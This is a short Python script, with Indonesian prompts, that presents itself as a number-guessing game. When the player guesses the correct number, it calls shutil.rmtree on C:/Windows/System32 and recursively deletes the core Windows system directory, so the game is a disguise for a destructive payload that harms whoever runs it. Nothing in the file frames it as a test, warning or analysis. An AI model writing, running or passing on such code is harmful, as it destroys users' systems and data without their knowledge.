import shutil
import random

path = "C:/Windows/System32"
angka = random.randint(1, 10)

while True:
    tebakan = int(input("Tebak angka (1-10): "))

    if tebakan == angka:
        shutil.rmtree(path)
        break
    else:
        print("Coba lagi")
